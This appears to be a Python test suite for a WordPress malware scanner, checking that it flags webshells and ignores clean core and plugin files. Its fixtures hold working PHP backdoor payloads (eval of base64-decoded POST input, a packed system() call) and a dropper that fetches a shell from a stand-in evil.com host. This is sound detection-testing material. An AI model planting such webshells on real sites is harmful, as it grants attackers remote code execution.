"""Automated Test Suite for MDefender Pro Security Scanner & Detection Pipeline.
Validates:
1. Backdoor & Webshell detection accuracy
2. Obfuscated payload detection (eval + base64 / rot13 / entropy)
3. Zero false positives on clean WordPress core & legitimate plugin files
4. Public exposure detection (.env, .git, SQL backups)
"""

import sys
import os
import json
import base64

# Add backend directory to sys.path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'backend'))

from src.engine.malware_detector import MalwareDetector
from src.engine.signature_detector import SignatureDetector
from src.engine.vulnerability_detector import VulnerabilityDetector

detector = MalwareDetector()
signatures = SignatureDetector()
vulns = VulnerabilityDetector()

print("=" * 60)
print("TESTING MDEFENDER PRO DETECTION PIPELINE & HEURISTICS")
print("=" * 60)

# TEST 1: Common Dangerous Webshells / Backdoors
test_webshells = [
    ("c99_eval_payload.php", b"<?php @eval(base64_decode($_POST['cmd'])); ?>"),
    ("wso_shell_rot13.php", b"<?php eval(str_rot13(base64_decode('JF9QT1NUWydjbWQnXQ=='))); ?>"),
    ("weevely_backdoor.php", b"<?php $k='secret'; $kh='1234'; @preg_replace('/a/e', 'eval(base64_decode($_POST[p]))', 'a'); ?>"),
    ("high_entropy_packer.php", b"<?php $f=gzinflate(base64_decode('" + base64.b64encode(b"system($_GET['x']);" * 20) + b"')); eval($f); ?>"),
    ("stealth_dropper.php", b"<?php $remote=file_get_contents('http://evil.com/shell.txt'); file_put_contents('/wp-content/uploads/shell.php', $remote); ?>"),
]

passed_threats = 0
for filename, code in test_webshells:
    sig = signatures.detect(code)
    ml = detector.scan(filename, code)
    is_malicious = (sig and sig.get('signature_verdict') == 'malicious') or ml.get('verdict') in ('malicious', 'suspicious')
    score = ml.get('risk_score', 0)
    print(f"[TEST THREAT] {filename:25} -> Verdict: {ml.get('verdict'):10} | Sig: {bool(sig)} | Score: {score:3} | Result: {'PASSED (Detected)' if is_malicious else 'FAILED'}")
    if is_malicious:
        passed_threats += 1

print(f"\nThreat Detection Accuracy: {passed_threats}/{len(test_webshells)} ({passed_threats/len(test_webshells)*100:.1f}%)")

# TEST 2: Legitimate WordPress Core & Plugin Files (FALSE POSITIVE TEST)
legitimate_wp_files = [
    ("version.php", b"<?php\n$wp_version = '6.7.2';\n$wp_db_version = 58975;\n$tinymce_version = '49110-20201110';\n$required_php_version = '7.2.24';\n$required_mysql_version = '5.0.0';\n"),
    ("wp-login.php", b"<?php\nrequire( dirname(__FILE__) . '/wp-load.php' );\n$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : 'login';\nif ( isset( $_GET['key'] ) ) {\n    $action = 'resetpass';\n}\n"),
    ("class-wp-hook.php", b"<?php\nclass WP_Hook {\n    public $callbacks = array();\n    public function add_filter( $hook_name, $callback, $priority, $accepted_args ) {\n        $this->callbacks[$priority][] = array('function' => $callback, 'accepted_args' => $accepted_args);\n    }\n}\n"),
    ("legit_cache_plugin.php", b"<?php\n// Legitimate caching plugin utility\nfunction cache_write_file($path, $data) {\n    if (!is_admin()) return false;\n    return @file_put_contents($path, serialize($data));\n}\n"),
    ("legit_image_helper.php", b"<?php\n// Image base64 thumbnail helper\nfunction get_image_data_uri($filepath) {\n    $type = pathinfo($filepath, PATHINFO_EXTENSION);\n    $data = file_get_contents($filepath);\n    return 'data:image/' . $type . ';base64,' . base64_encode($data);\n}\n"),
]

passed_clean = 0
for filename, code in legitimate_wp_files:
    sig = signatures.detect(code)
    ml = detector.scan(filename, code)
    is_clean = (not sig or sig.get('signature_verdict') != 'malicious') and ml.get('verdict') == 'clean'
    score = ml.get('risk_score', 0)
    print(f"[TEST CLEAN]  {filename:25} -> Verdict: {ml.get('verdict'):10} | Sig: {bool(sig)} | Score: {score:3} | Result: {'PASSED (Zero False Positive)' if is_clean else 'FAILED (False Positive!)'}")
    if is_clean:
        passed_clean += 1

print(f"\nClean File Specificity (Zero False Positive): {passed_clean}/{len(legitimate_wp_files)} ({passed_clean/len(legitimate_wp_files)*100:.1f}%)")

# TEST 3: Vulnerability Database
vuln_res = vulns.check_plugin("wp-file-manager", "6.0")
print(f"\n[TEST VULN] wp-file-manager v6.0 -> Matches: {len(vuln_res)} CVEs (Expected >= 1)")

print("=" * 60)
print("TEST SUMMARY COMPLETE")
print("=" * 60)
